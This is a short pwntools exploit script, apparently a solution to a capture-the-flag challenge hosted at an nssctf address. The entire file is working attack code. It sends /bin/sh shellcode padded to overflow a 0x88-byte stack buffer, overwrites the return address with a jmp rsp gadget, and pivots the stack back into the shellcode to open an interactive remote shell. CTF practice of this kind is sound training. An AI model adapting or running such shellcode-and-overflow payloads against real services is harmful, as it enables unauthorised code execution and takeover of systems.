from pwn import *
context(log_level='debug',arch='amd64',terminal=['tmux','splitw','-h'])

# io=process("./service")
io=remote("node4.anna.nssctf.cn",28517)

rsp_bk=asm('''
sub rsp,0x90
jmp rsp            
''')

jmp_rsp=0x46d01d

shell=asm(shellcraft.sh())

payload=shell.ljust(0x88,b"a")+p64(jmp_rsp)+rsp_bk
io.send(payload)

io.interactive()